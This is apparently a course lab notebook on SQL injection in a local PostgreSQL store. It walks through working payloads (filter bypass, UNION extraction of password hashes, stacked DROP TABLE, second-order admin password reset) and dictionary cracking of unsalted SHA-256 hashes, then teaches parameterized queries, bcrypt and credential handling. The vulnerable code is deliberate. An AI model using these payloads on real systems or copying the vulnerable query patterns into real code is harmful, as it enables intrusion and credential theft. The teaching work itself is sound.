---
title: "Lab: SQL Injection & Secure Connectivity"
week: 11
type: lab
tags: [security, sql-injection, parameterized-queries, credentials, dotenv, postgres, hashing]
difficulty: intermediate
duration: "65 mins"
---

# Lab: SQL Injection & Secure Connectivity

**Note on lesson order:** This lab comes *before* the concept reading. You will attack a deliberately vulnerable search function, watch it fall apart, and only then read the concept file to understand why each defense works. The attacks you perform here will make the theory concrete.

---

## 1. Prerequisites & Setup

**Before starting this lab, you should:**
*   Be comfortable with basic SQL (`SELECT`, `WHERE`, `INSERT`, `UNION`)
*   Recall that Python f-strings substitute variables into strings at format time

**What you'll accomplish:**
1. Build a vulnerable product-search function and exploit it through five escalating attacks
2. Rewrite it using parameterized queries and replay every attack
3. See what happens when stolen password hashes are weak vs. salted vs. bcrypted
4. Observe second-order injection: malicious data that lies dormant in the database and fires on a later query
5. Practice secure credential management with `.env` files

**Important — ethical framing:** This lab runs on a **disposable local PostgreSQL instance you own**. Performing these attacks against any system you do not own or have explicit written permission to test is a federal crime under the U.S. Computer Fraud and Abuse Act (18 U.S.C. § 1030) and analogous statutes in Puerto Rico. Security knowledge is defensive; using it otherwise ends careers.

---

### Environment Setup

```python
%%bash
# Install PostgreSQL in the Colab runtime
apt-get update -qq
apt-get install -y -qq postgresql postgresql-contrib > /dev/null
service postgresql start
sudo -u postgres psql -c "ALTER USER postgres PASSWORD 'labpass';"
echo "PostgreSQL started"
```

```python
# Setup: Install Python packages
!pip install -q psycopg2-binary python-dotenv bcrypt

import psycopg2
import hashlib
import os
import secrets
import time
from dotenv import load_dotenv

# Connect to PostgreSQL (local lab environment — credentials are intentionally visible here)
conn = psycopg2.connect(
    host="localhost",
    port=5432,
    user="postgres",
    password="labpass",
    dbname="postgres"
)
conn.autocommit = True
cursor = conn.cursor()

print("Connected to PostgreSQL")
```

<details>
<summary>Expected Output</summary>

~~~text
PostgreSQL started
Connected to PostgreSQL
~~~

</details>

---

## 2. Build the Target Database

Our scenario: a small online store. The **public** table is `products` — the search box on the storefront reads from this. The **private** table is `users` — it holds accounts and password hashes. The attacker only has access to the search box. Their goal is to reach the `users` table anyway.

```python
cursor.execute("DROP TABLE IF EXISTS products")
cursor.execute("DROP TABLE IF EXISTS users")

cursor.execute("""
    CREATE TABLE products (
        id          INT PRIMARY KEY,
        name        TEXT NOT NULL,
        description TEXT,
        price       NUMERIC(10, 2) NOT NULL
    )
""")

cursor.execute("""
    INSERT INTO products (id, name, description, price) VALUES
    (1,  'Laptop Pro 15',    'Lightweight aluminum laptop with 16GB RAM',       1299.99),
    (2,  'Laptop Air 13',    'Ultra-thin laptop for students and travelers',     999.00),
    (3,  'Wireless Mouse',   'Ergonomic mouse with USB-C receiver',               29.99),
    (4,  'Mechanical Keyboard', 'Tactile blue switches, RGB backlight',           89.99),
    (5,  'USB-C Hub',        '7-in-1 adapter for modern laptops',                 49.99),
    (6,  'Webcam 1080p',     'Plug-and-play webcam with built-in microphone',     59.99),
    (7,  'Monitor 27',       '27-inch 4K display with USB-C power delivery',     449.00),
    (8,  'Headphones ANC',   'Wireless noise-cancelling over-ear headphones',    279.99),
    (9,  'External SSD',     '1TB portable NVMe drive',                          129.00),
    (10, 'Phone Stand',      'Adjustable aluminum stand for phones and tablets',  19.99)
""")

cursor.execute("""
    CREATE TABLE users (
        id              INT PRIMARY KEY,
        username        TEXT UNIQUE NOT NULL,
        email           TEXT,
        password_hash   TEXT NOT NULL,
        role            TEXT DEFAULT 'user'
    )
""")

# Passwords hashed with plain SHA-256 (deliberately weak for the demo in §5.5)
def sha256(s):
    return hashlib.sha256(s.encode()).hexdigest()

cursor.execute("""
    INSERT INTO users (id, username, email, password_hash, role) VALUES
    (1, 'admin',  'admin@store.pr',  %s, 'admin'),
    (2, 'luis',   'luis@store.pr',   %s, 'user'),
    (3, 'maria',  'maria@store.pr',  %s, 'user'),
    (4, 'carlos', 'carlos@store.pr', %s, 'user'),
    (5, 'sofia',  'sofia@store.pr',  %s, 'admin')
""", (
    sha256("password123"),
    sha256("qwerty"),
    sha256("correct horse battery staple"),
    sha256("123456"),
    sha256("hunter2"),
))

cursor.execute("SELECT COUNT(*) FROM products")
n_products = cursor.fetchone()[0]
cursor.execute("SELECT COUNT(*) FROM users")
n_users = cursor.fetchone()[0]
print(f"products table: {n_products} rows")
print(f"users table:    {n_users} rows  (password hashes stored as SHA-256)")
```

<details>
<summary>Expected Output</summary>

~~~text
products table: 10 rows
users table:    5 rows  (password hashes stored as SHA-256)
~~~

</details>

**Key design detail — remember this:** the `products` table has four columns, but the search function only exposes three: `(id INT, name TEXT, description TEXT)`. The hidden `price` column never appears in the SELECT list, so the attacker can't see it directly — and the *SELECT's* shape, not the table's, is the *window* the attacker is forced to work inside.

---

## 3. The Vulnerable Search Function

A naive storefront might implement the search bar like this:

```python
def search_products_vulnerable(query):
    """
    VULNERABLE: builds SQL by concatenating user input with f-strings.
    The caller supplies their own wildcards (e.g., 'Laptop%' or '%phone%').
    """
    sql = f"SELECT id, name, description FROM products WHERE name ILIKE '{query}'"
    print(f"  SQL sent: {sql}")
    cursor.execute(sql)
    return cursor.fetchall()
```

Notice what this function does **not** do: no `%` wrapping, no input validation, no parameterization. The caller controls the string that lands inside the single quotes.

### Normal Usage

```python
print("=== Exact match ===")
for row in search_products_vulnerable("Wireless Mouse"):
    print(" ", row)

print("\n=== Prefix match with wildcard ===")
for row in search_products_vulnerable("Laptop%"):
    print(" ", row)

print("\n=== Substring match with wildcards ===")
for row in search_products_vulnerable("%phone%"):
    print(" ", row)
```

<details>
<summary>Expected Output</summary>

~~~text
=== Exact match ===
  SQL sent: SELECT id, name, description FROM products WHERE name ILIKE 'Wireless Mouse'
  (3, 'Wireless Mouse', 'Ergonomic mouse with USB-C receiver')

=== Prefix match with wildcard ===
  SQL sent: SELECT id, name, description FROM products WHERE name ILIKE 'Laptop%'
  (1, 'Laptop Pro 15', 'Lightweight aluminum laptop with 16GB RAM')
  (2, 'Laptop Air 13', 'Ultra-thin laptop for students and travelers')

=== Substring match with wildcards ===
  SQL sent: SELECT id, name, description FROM products WHERE name ILIKE '%phone%'
  (6, 'Webcam 1080p', 'Plug-and-play webcam with built-in microphone')
  (10, 'Phone Stand', 'Adjustable aluminum stand for phones and tablets')
~~~

</details>

The wildcard is already a hint that user input is being *interpreted* by the database, not just compared. That's a small invitation. The attacker will take a much bigger one.

---

## 4. The Attack Ladder

Each rung teaches something different. You'll escalate from "break the filter" through "probe the schema" to "exfiltrate another table."

### Rung 1 — Filter Bypass

**Goal:** make the search return every row, regardless of the filter.

```python
print("=== Rung 1: filter bypass ===")
rows = search_products_vulnerable("' OR 1=1 --")
print(f"\nReturned {len(rows)} rows (table has 10)")
```

<details>
<summary>Expected Output & Explanation</summary>

~~~text
=== Rung 1: filter bypass ===
  SQL sent: SELECT id, name, description FROM products WHERE name ILIKE '' OR 1=1 --'

Returned 10 rows (table has 10)
~~~

**What happened:**
*   The leading `'` closes the opening quote that the f-string was supposed to contain.
*   `OR 1=1` makes the `WHERE` clause true for every row.
*   `--` starts a SQL line comment, silencing the stray trailing `'` and anything after it.

The attacker has just destroyed the filter. This is also exactly how login bypasses work — "always-true" grafted onto the end of a `WHERE` clause.

</details>

### Rung 2 — Column Discovery

The attacker doesn't know the schema of the target table. They probe it. `ORDER BY N` is the classic reconnaissance trick: the database errors if `N` is out of range, and succeeds if `N` is valid.

```python
print("=== Rung 2a: ORDER BY 4 (expect an error) ===")
try:
    search_products_vulnerable("' ORDER BY 4 --")
except Exception as e:
    print(f"  ERROR: {e}")

# Reset the transaction state after the error
conn.rollback()

print("\n=== Rung 2b: ORDER BY 3 (expect success) ===")
rows = search_products_vulnerable("' ORDER BY 3 --")
print(f"  Returned {len(rows)} rows — the SELECT has 3 columns.")
```

<details>
<summary>Expected Output & Explanation</summary>

~~~text
=== Rung 2a: ORDER BY 4 (expect an error) ===
  SQL sent: SELECT id, name, description FROM products WHERE name ILIKE '' ORDER BY 4 --'
  ERROR: ORDER BY position 4 is not in select list
  ...

=== Rung 2b: ORDER BY 3 (expect success) ===
  SQL sent: SELECT id, name, description FROM products WHERE name ILIKE '' ORDER BY 3 --'
  Returned 0 rows — the SELECT has 3 columns.
~~~

**What happened:**

Error messages are a gift to the attacker. PostgreSQL helpfully told them exactly how many columns exist. Production systems should never leak errors to users — a generic "something went wrong" is plenty. The attacker now knows the query shape is 3 columns wide.

</details>

### Rung 3 — Type Probing with UNION

`UNION SELECT` stitches a second query's rows onto the first, but only if the column *counts and types* line up. That's the "restriction window" — the attacker cannot invent new columns, and cannot send a string where the DB expects an integer. They must probe.

```python
print("=== Rung 3a: three NULLs — do column counts line up? ===")
rows = search_products_vulnerable("' UNION SELECT NULL, NULL, NULL --")
print(f"  Returned {len(rows)} rows")

print("\n=== Rung 3b: which slots accept strings? (expect a type error) ===")
# Replace each NULL with a string literal. Slot 1 is INT, so 'A' should fail.
try:
    search_products_vulnerable("' UNION SELECT 'A', 'B', 'C' --")
except Exception as e:
    print(f"  ERROR: {type(e).__name__}: {e}")

conn.rollback()

print("\n=== Rung 3c: first slot is INT, other two are TEXT ===")
rows = search_products_vulnerable("' UNION SELECT 999, 'hello', 'world' --")
for r in rows[-3:]:
    print(" ", r)
```

<details>
<summary>Expected Output & Explanation</summary>

~~~text
=== Rung 3a: three NULLs — do column counts line up? ===
  SQL sent: SELECT id, name, description FROM products WHERE name ILIKE '' UNION SELECT NULL, NULL, NULL --'
  Returned 1 rows

=== Rung 3b: which slots accept strings? (expect a type error) ===
  SQL sent: SELECT id, name, description FROM products WHERE name ILIKE '' UNION SELECT 'A', 'B', 'C' --'
  ERROR: InvalidTextRepresentation: invalid input syntax for type integer: "A"

=== Rung 3c: first slot is INT, other two are TEXT ===
  SQL sent: SELECT id, name, description FROM products WHERE name ILIKE '' UNION SELECT 999, 'hello', 'world' --'
  (999, 'hello', 'world')
~~~

**The restriction window, made concrete:**

*   Your UNION must match `(int, text, text)`. Not `(text, text, text)`. Not `(int, text)`. Not `(int, text, text, text)`.
*   This is not a quirk of SQL injection — it's how `UNION` works. The attacker is writing *valid SQL that fits the victim query's shape*.
*   That is the heart of the concept: **injection is grammar conformance, not escape-sequence magic.** The attacker wins by speaking SQL inside the slot you left open, not by sneaking past a filter.

</details>

### Rung 4 — Data Exfiltration

Now the payoff. The attacker knows the shape. They use it as a channel to siphon the `users` table through the products search results.

```python
print("=== Rung 4: extract users via UNION ===")
# Place a sentinel integer in slot 1; real data rides slots 2 and 3.
rows = search_products_vulnerable(
    "' UNION SELECT 0, username, password_hash FROM users --"
)
print(f"\nRows returned: {len(rows)}  (10 products + 5 users)")
print("\nThe leaked rows — note the sentinel id=0:")
for r in rows:
    if r[0] == 0:
        print(f"  STOLEN -> username={r[1]!r}  hash={r[2][:16]}...")
```

<details>
<summary>Expected Output & Explanation</summary>

~~~text
=== Rung 4: extract users via UNION ===
  SQL sent: SELECT id, name, description FROM products WHERE name ILIKE '' UNION SELECT 0, username, password_hash FROM users --

Rows returned: 15  (10 products + 5 users)

The leaked rows — note the sentinel id=0:
  STOLEN -> username='admin'   hash='ef92b778bafe771e...'
  STOLEN -> username='luis'    hash='65e84be33532fb78...'
  STOLEN -> username='maria'   hash='c4bbcb1fbec99d65...'
  STOLEN -> username='carlos'  hash='8d969eef6ecad3c2...'
  STOLEN -> username='sofia'   hash='f52fbd32b2b3b86f...'
~~~

**This is the breach moment.** Through a *product search bar*, an attacker just exfiltrated every user's credentials. They never touched a login form. They never had a valid account. The vulnerability was in a completely different feature — and the `users` table paid for it.

Keep the stolen hashes. We'll crack them in §5.5 and then see how defense-in-depth would have bounded the damage.

</details>

### Rung 5 — Destruction *(optional)*

Depending on the driver's multi-statement handling and the database user's privileges, an attacker can chain arbitrary statements:

```python
print("=== Rung 5: stacked destruction (psycopg2 allows this) ===")

cursor.execute("SELECT COUNT(*) FROM products")
before = cursor.fetchone()[0]

# Stacked statements: close the SELECT with ' , add DROP, comment out the rest.
try:
    search_products_vulnerable("'; DROP TABLE products; --")
except Exception as e:
    print(f"  (query returned no result set: {type(e).__name__})")

try:
    cursor.execute("SELECT COUNT(*) FROM products")
    after = cursor.fetchone()[0]
except Exception as e:
    after = f"TABLE GONE ({type(e).__name__})"

conn.rollback()
print(f"\n  products rows before: {before}")
print(f"  products rows after:  {after}")
```

<details>
<summary>Expected Output & Explanation</summary>

~~~text
=== Rung 5: stacked destruction (psycopg2 allows this) ===
  SQL sent: SELECT id, name, description FROM products WHERE name ILIKE ''; DROP TABLE products; --'

  products rows before: 10
  products rows after:  TABLE GONE (UndefinedTable)
~~~

**Why this works — and why it doesn't always:**

*   `psycopg2` allows multiple statements per `execute()` call. Many drivers (PHP's mysqli, some Java setups) do not, which is one reason those stacks feel "safer." They aren't — UNION-based read attacks still work fine.
*   The DB user's privileges set the ceiling. Our `postgres` superuser can do anything. A least-privileged app user (`SELECT` on `products` only) could not have dropped the table. This is why the concept file will insist on the **principle of least privilege**: it doesn't prevent SQLi, but it caps the blast radius.

Now rebuild the table so we can continue:

</details>

```python
# Restore products so later sections can use it
cursor.execute("""
    CREATE TABLE IF NOT EXISTS products (
        id          INT PRIMARY KEY,
        name        TEXT NOT NULL,
        description TEXT,
        price       NUMERIC(10, 2) NOT NULL
    )
""")
cursor.execute("""
    INSERT INTO products (id, name, description, price) VALUES
    (1,  'Laptop Pro 15',    'Lightweight aluminum laptop with 16GB RAM',       1299.99),
    (2,  'Laptop Air 13',    'Ultra-thin laptop for students and travelers',     999.00),
    (3,  'Wireless Mouse',   'Ergonomic mouse with USB-C receiver',               29.99),
    (4,  'Mechanical Keyboard', 'Tactile blue switches, RGB backlight',           89.99),
    (5,  'USB-C Hub',        '7-in-1 adapter for modern laptops',                 49.99),
    (6,  'Webcam 1080p',     'Plug-and-play webcam with built-in microphone',     59.99),
    (7,  'Monitor 27',       '27-inch 4K display with USB-C power delivery',     449.00),
    (8,  'Headphones ANC',   'Wireless noise-cancelling over-ear headphones',    279.99),
    (9,  'External SSD',     '1TB portable NVMe drive',                          129.00),
    (10, 'Phone Stand',      'Adjustable aluminum stand for phones and tablets',  19.99)
    ON CONFLICT (id) DO NOTHING
""")
print("products restored.")
```

---

## 5. The Fix: Parameterized Queries

The vulnerable pattern is **concatenation**: user input becomes part of the SQL string *before* the database sees it. The fix is to send the SQL template and the data **separately**, so the database parses the grammar first and binds the data afterward — as data, not as code.

```python
def search_products_safe(query):
    """
    SAFE: the SQL template and the user input travel as separate arguments.
    The driver ensures `query` is treated as a literal value, never as SQL.
    """
    sql = "SELECT id, name, description FROM products WHERE name ILIKE %s"
    cursor.execute(sql, (query,))
    # cursor.query shows what the driver ACTUALLY sent (after binding) — use this to see
    # exactly how the payload is sitting inside the query as a quoted literal.
    print(f"  Driver sent: {cursor.query.decode()}")
    return cursor.fetchall()
```

### Normal usage still works — wildcards included

```python
print("=== Safe: prefix search ===")
for row in search_products_safe("Laptop%"):
    print(" ", row)

print("\n=== Safe: substring search ===")
for row in search_products_safe("%phone%"):
    print(" ", row)
```

<details>
<summary>Expected Output</summary>

~~~text
=== Safe: prefix search ===
  Driver sent: SELECT id, name, description FROM products WHERE name ILIKE 'Laptop%'
  (1, 'Laptop Pro 15', 'Lightweight aluminum laptop with 16GB RAM')
  (2, 'Laptop Air 13', 'Ultra-thin laptop for students and travelers')

=== Safe: substring search ===
  Driver sent: SELECT id, name, description FROM products WHERE name ILIKE '%phone%'
  (6, 'Webcam 1080p', 'Plug-and-play webcam with built-in microphone')
  (10, 'Phone Stand', 'Adjustable aluminum stand for phones and tablets')
~~~

The `%` sits *inside the literal value*. The database still treats it as a LIKE wildcard (that's what LIKE does), but it's not part of the grammar the driver parsed.

</details>

### Replay every attack against the safe function

```python
payloads = [
    ("Rung 1: filter bypass",   "' OR 1=1 --"),
    ("Rung 2: ORDER BY probe",  "' ORDER BY 3 --"),
    ("Rung 3: UNION shape",     "' UNION SELECT 999, 'x', 'y' --"),
    ("Rung 4: exfiltrate users","' UNION SELECT 0, username, password_hash FROM users --"),
    ("Rung 5: DROP stacked",    "'; DROP TABLE products; --"),
]

for label, payload in payloads:
    print(f"=== {label} ===")
    rows = search_products_safe(payload)
    print(f"  rows returned: {len(rows)}")
    print()

cursor.execute("SELECT COUNT(*) FROM products")
print(f"products table intact: {cursor.fetchone()[0]} rows")
```

<details>
<summary>Expected Output & Explanation</summary>

~~~text
=== Rung 1: filter bypass ===
  Driver sent: SELECT id, name, description FROM products WHERE name ILIKE '' OR 1=1 --'
  rows returned: 0

=== Rung 2: ORDER BY probe ===
  Driver sent: SELECT id, name, description FROM products WHERE name ILIKE ''' ORDER BY 3 --'
  rows returned: 0

=== Rung 3: UNION shape ===
  Driver sent: SELECT id, name, description FROM products WHERE name ILIKE ''' UNION SELECT 999, ''x'', ''y'' --'
  rows returned: 0

=== Rung 4: exfiltrate users ===
  Driver sent: SELECT id, name, description FROM products WHERE name ILIKE ''' UNION SELECT 0, username, password_hash FROM users --'
  rows returned: 0

=== Rung 5: DROP stacked ===
  Driver sent: SELECT id, name, description FROM products WHERE name ILIKE '''; DROP TABLE products; --'
  rows returned: 0

products table intact: 10 rows
~~~

**Look carefully at `Driver sent:` in each case.** The entire payload is wrapped in single quotes and the internal quotes are escaped (`''`). The database is searching for a literal product whose `name` equals `' OR 1=1 --`. No such product exists — of course not. The injection payload has been neutered into a search term.

**Formatting syntax is a red herring.** These are all equivalent bugs:

~~~python
# Equally vulnerable, all for the same reason: user input becomes grammar.
sql = f"... WHERE name ILIKE '{query}'"
sql = "... WHERE name ILIKE '{}'".format(query)
sql = "... WHERE name ILIKE '%s'" % query
sql = "... WHERE name ILIKE '" + query + "'"
~~~

The fix is never "pick a safer string operator." The fix is: **stop concatenating**. Use `cursor.execute(sql, params)`.

</details>

---

## 5.5 Defense in Depth: What Happens to the Stolen Hashes?

Go back to Rung 4. The attacker walked away with five rows that look like this:

~~~text
username='admin' hash='ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f'
username='luis'  hash='65e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5'
...
~~~

Those are SHA-256 hashes. Cryptographic one-way functions — the attacker cannot "reverse" them. But they don't need to. They just need to guess.

### Demo 1 — Plain SHA-256 is broken

The attacker runs a dictionary attack: hash a list of common passwords, compare to the stolen hashes.

```python
# The hashes the attacker exfiltrated in Rung 4
stolen = {
    "admin":  "ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f",
    "luis":   "65e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5",
    "maria":  "c4bbcb1fbec99d65bf59d85c8cb62ee2db963f0fe106f483d9afa73bd4e39a8a",
    "carlos": "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92",
    "sofia":  "f52fbd32b2b3b86ff88ef6c490628285f482af15ddcb29541f94bcf526a3f6c7",
}

# A tiny "rockyou-style" wordlist — real ones have millions of entries
wordlist = [
    "123456", "password", "qwerty", "abc123", "password123",
    "letmein", "hunter2", "dragon", "monkey", "iloveyou",
    "trustno1", "correct horse battery staple",
]

print("=== Dictionary attack against unsalted SHA-256 ===\n")
t0 = time.time()
cracked = {}
for user, target in stolen.items():
    for guess in wordlist:
        if hashlib.sha256(guess.encode()).hexdigest() == target:
            cracked[user] = guess
            break

elapsed = time.time() - t0
for user, pw in cracked.items():
    print(f"  {user:7s} -> {pw!r}")
print(f"\nCracked {len(cracked)}/{len(stolen)} in {elapsed*1000:.1f} ms.")
```

<details>
<summary>Expected Output & Explanation</summary>

~~~text
=== Dictionary attack against unsalted SHA-256 ===

  admin   -> 'password123'
  luis    -> 'qwerty'
  maria   -> 'correct horse battery staple'
  carlos  -> '123456'
  sofia   -> 'hunter2'

Cracked 5/5 in ~2 ms.
~~~

**All five accounts cracked in milliseconds**, including the strong passphrase, because our wordlist happens to contain it. GPUs compute SHA-256 at billions of hashes per second. Against an unsalted general-purpose hash, any password that appears in any wordlist is effectively already cracked the moment the attacker gets the hash.

</details>

### Demo 2 — Salting breaks precomputation

A **salt** is a random per-user value that gets mixed into the password before hashing. Same password, different salts → different hashes. Rainbow tables and shared precomputation no longer work.

```python
def hash_with_salt(password, salt):
    return hashlib.sha256((salt + password).encode()).hexdigest()

# Two users pick the exact same password
salt_a = secrets.token_hex(16)
salt_b = secrets.token_hex(16)
h_a = hash_with_salt("password123", salt_a)
h_b = hash_with_salt("password123", salt_b)

print(f"salt A: {salt_a}\n   hash: {h_a}\n")
print(f"salt B: {salt_b}\n   hash: {h_b}\n")
print(f"Same password, different hashes: {h_a != h_b}")
```

<details>
<summary>Expected Output & Explanation</summary>

~~~text
salt A: 3f2a91...
   hash: 8e1a4c...
salt B: 7b29ee...
   hash: c4d810...

Same password, different hashes: True
~~~

**What salting buys you:**

*   A rainbow table (precomputed `password → hash` lookup) built without knowing the salt is useless.
*   Two users with the same password have *different* stored hashes — so cracking one doesn't crack the other for free.
*   The attacker must re-run the dictionary attack for *each user individually*, against *each user's salt*.

What salting does **not** buy you: slowness. SHA-256 is still blazing fast; the attacker just does N times the work. Which brings us to iteration.

</details>

### Demo 3 — Iteration makes brute force economically infeasible

`bcrypt` is designed to be slow, with a tunable **cost factor**. Each `+1` of cost roughly doubles the time per hash. On modern hardware, cost=12 takes ~250 ms per password. A GPU farm doing billions of SHA-256/sec is now doing *maybe a few thousand* bcrypt/sec per device.

```python
import bcrypt

password = b"password123"

# Cost factor 12 is typical for 2025 web apps
t0 = time.time()
hashed = bcrypt.hashpw(password, bcrypt.gensalt(rounds=12))
single_hash_ms = (time.time() - t0) * 1000

print(f"One bcrypt hash (cost=12): {single_hash_ms:.0f} ms")
print(f"bcrypt output: {hashed.decode()[:40]}...  (includes salt + cost)")

# Verify
print(f"bcrypt.checkpw matches:    {bcrypt.checkpw(password, hashed)}")
print(f"bcrypt.checkpw wrong pass: {bcrypt.checkpw(b'wrong', hashed)}")

# Project how long a dictionary attack would take
wordlist_size = 14_000_000  # order-of-magnitude of rockyou.txt
print(f"\nBrute-force 14M-word list against ONE bcrypt hash: "
      f"{wordlist_size * single_hash_ms / 1000 / 3600:.0f} hours on this CPU")
```

<details>
<summary>Expected Output & Explanation</summary>

~~~text
One bcrypt hash (cost=12): ~250 ms
bcrypt output: $2b$12$a3K9...                     (includes salt + cost)
bcrypt.checkpw matches:    True
bcrypt.checkpw wrong pass: False

Brute-force 14M-word list against ONE bcrypt hash: ~970 hours on this CPU
~~~

**The full defense-in-depth picture:**

| Scheme            | Dictionary attack against stolen hashes |
|-------------------|-----------------------------------------|
| Plaintext         | Already cracked. No "attack" needed.    |
| SHA-256, unsalted | ~milliseconds for the whole user list (GPU: microseconds). Rainbow tables exist. |
| SHA-256 + salt    | Still ~seconds per user on GPU. No shared precomputation.                         |
| bcrypt (cost=12)  | Hours to weeks *per user* on a GPU farm. Strong passwords are effectively safe.   |
| argon2id          | Same idea as bcrypt but memory-hard: resists GPU/ASIC acceleration. Modern default. |

**The moral:** SQL injection is the breach you must prevent. Strong hashing is the dam that holds when prevention fails. Real systems need both — that's what "defense in depth" means.

Note: for the rest of this lab we keep SHA-256 so the existing demos still work. Do not copy this choice into production code.

</details>

---

## 6. Second-Order Injection

Parameterized queries only help where you use them. Second-order injection is the version of the attack that fires **on a later query**, not the one that received the input. The malicious data is stored cleanly. Then some *other* code reads it back and concatenates it into a new query — and the bomb goes off.

```python
# Step 1: an attacker registers with a malicious username.
# This INSERT is parameterized, so the string is stored LITERALLY. No injection here.
malicious = "admin' --"
cursor.execute(
    "INSERT INTO users (id, username, email, password_hash, role) VALUES (%s, %s, %s, %s, %s)",
    (99, malicious, "evil@attacker.example", sha256("doesntmatter"), "user"),
)
cursor.execute("SELECT id, username FROM users WHERE id = 99")
print("Stored safely:", cursor.fetchone())
```

```python
# Step 2: later, another piece of code reads that username back and
# concatenates it into a new query — because the developer assumed
# "it came from our own database, it must be safe."

def reset_password_vulnerable(user_id, new_password_hash):
    """
    VULNERABLE: builds the UPDATE by string-concatenating a value that came from the DB.
    """
    cursor.execute("SELECT username FROM users WHERE id = %s", (user_id,))
    stored_username = cursor.fetchone()[0]       # <-- attacker's payload

    # The developer assumes the DB-sourced value is "clean." It isn't.
    sql = (f"UPDATE users SET password_hash = '{new_password_hash}' "
           f"WHERE username = '{stored_username}'")
    print(f"  SQL sent: {sql}")
    cursor.execute(sql)

# Attacker triggers "reset my password" for their own account (id=99).
# What actually happens: the UPDATE's WHERE clause is rewritten.
new_hash = sha256("attacker_chosen_new_password")
reset_password_vulnerable(user_id=99, new_password_hash=new_hash)

# Check what actually changed
cursor.execute("SELECT username, password_hash FROM users WHERE username = 'admin'")
for row in cursor.fetchall():
    print(f"  {row[0]:10s} hash={row[1][:16]}...")
```

<details>
<summary>Expected Output & Explanation</summary>

~~~text
Stored safely: (99, "admin' --")

  SQL sent: UPDATE users SET password_hash = '<attacker_hash>' WHERE username = 'admin' --'

  admin      hash=<ATTACKER-CONTROLLED HASH>
~~~

**What happened:** the stored username is the string `admin' --`. When it's concatenated into the UPDATE, the rendered SQL becomes:

~~~sql
UPDATE users SET password_hash = '...' WHERE username = 'admin' --'
~~~

The `--` comments out the trailing `'` and anything after. The `WHERE` clause now matches the username `admin`, not the attacker's account. The attacker has just reset `admin`'s password to a value they chose.

**The lesson:** *data gets tainted once and stays tainted.* Parameterize every query, not only the ones reading `request.form`. The database is not a sanitizer.

</details>

```python
# Clean up the second-order demo before continuing
cursor.execute("DELETE FROM users WHERE id = 99")
# Restore admin's original hash
cursor.execute("UPDATE users SET password_hash = %s WHERE username = 'admin'",
               (sha256("password123"),))
print("second-order demo cleaned up.")
```

---

## 7. Secure Credential Management (brief)

Even a perfectly parameterized app is compromised if its credentials leak. This is the second most common breach path after SQLi itself.

### Anti-pattern

~~~python
# BAD: credentials visible in source code; if pushed to GitHub, compromised within minutes
conn = psycopg2.connect(host="prod-db", user="admin", password="Pr0d_P@ss!", dbname="prod")
~~~

### Pattern: `.env` + `python-dotenv` + `.gitignore`

```python
# Step 1: create a .env file (normally done by hand; we write it here for the demo)
with open(".env", "w") as f:
    f.write(
        "DB_HOST=localhost\n"
        "DB_PORT=5432\n"
        "DB_USER=postgres\n"
        "DB_PASSWORD=labpass\n"
        "DB_NAME=postgres\n"
    )

# Step 2: load it into os.environ
load_dotenv(override=True)

# Step 3: read credentials from the environment, never from source
conn2 = psycopg2.connect(
    host=os.environ["DB_HOST"],
    port=int(os.environ["DB_PORT"]),
    user=os.environ["DB_USER"],
    password=os.environ["DB_PASSWORD"],
    dbname=os.environ["DB_NAME"],
)
cur2 = conn2.cursor()
cur2.execute("SELECT current_user, current_database()")
print("Connected as", cur2.fetchone())
cur2.close()
conn2.close()
```

<details>
<summary>Expected Output</summary>

~~~text
Connected as ('postgres', 'postgres')
~~~

</details>

**Non-negotiable rules:**

1. `.env` goes in `.gitignore`. Every time. No exceptions.
2. If you commit a credential — even for a minute, even in a branch no one saw — **rotate it**. Removing the commit does not help; git history is forever, and bots scan GitHub commits in real time.
3. Production secrets belong in a secret manager (AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager) or in environment variables injected by the deployment system. `.env` is for local development only.
4. **Least privilege for the DB user.** Our lab uses the `postgres` superuser because it's simple to set up. A real app should connect as a user whose permissions are exactly what the feature needs: `SELECT` on the tables it reads, nothing more. Least privilege doesn't prevent SQLi — but it caps the blast radius.

---

## 8. Your Turn

### Exercise 1 — Harden an `INSERT`

The product-creation helper below is vulnerable. Rewrite it to use parameterized queries. Verify that an injection payload passed as `name` is stored as a literal string, not executed.

~~~python
def add_product_vulnerable(pid, name, description):
    sql = (f"INSERT INTO products (id, name, description) "
           f"VALUES ({pid}, '{name}', '{description}')")
    cursor.execute(sql)
~~~

```python
# TODO: write add_product_safe(pid, name, description) using parameterized queries.
# TODO: call it with a benign product (pid=200, name='Test', description='demo')
# TODO: call it with pid=201, name="'; DROP TABLE products; --", description='evil'
# TODO: verify the products table still exists and count >= 12
```

<details>
<summary>Expected behavior</summary>

The malicious name is stored as the literal value `'; DROP TABLE products; --` — a weird but harmless string in the `name` column. The table survives. Count is 12.

</details>

### Exercise 2 — Second-order injection, the fixed version

Rewrite `reset_password_vulnerable` from §6 so it is safe. The function must still read the username from the database, but the UPDATE must be parameterized.

```python
# TODO: reset_password_safe(user_id, new_password_hash)
# Requirements:
#   - SELECT the username using a parameterized query
#   - UPDATE using a parameterized query that binds BOTH the hash AND the username
#   - Replay the second-order attack from §6 and confirm admin's hash is NOT changed
```

### Exercise 3 — Credential audit

Review this snippet and list every distinct security issue. Aim for at least four.

~~~python
import psycopg2
conn = psycopg2.connect(host="prod-db.company.com", user="admin",
                        password="Pr0d_P@ssw0rd!", dbname="customers")
cur = conn.cursor()
name = input("name: ")
cur.execute(f"SELECT id, name, ssn, credit_card FROM customers WHERE name = '{name}'")
for row in cur.fetchall():
    print(row)
~~~

<details>
<summary>Discussion</summary>

1. **Hardcoded production credentials** — password in source; move to env / secret manager; rotate if this file ever existed in git.
2. **SQL injection** — f-string concatenation of `name`; use `%s` with parameters.
3. **Excessive data exposure** — SSN and credit card printed to stdout; the query selects columns the feature doesn't need. Pull only what's necessary; mask PII (e.g., last 4 digits).
4. **Superuser-level DB user** — `admin` for a read query breaks least privilege; a read-only user scoped to the `customers` table is correct.
5. *(bonus)* No TLS settings shown — in production, `sslmode=require` or stronger belongs on the connection.
6. *(bonus)* No logging of access to sensitive fields — regulated data (PCI, HIPAA) typically requires audit trails.

</details>

---

## 9. Cleanup

```python
cursor.execute("DROP TABLE IF EXISTS products")
cursor.execute("DROP TABLE IF EXISTS users")
cursor.close()
conn.close()

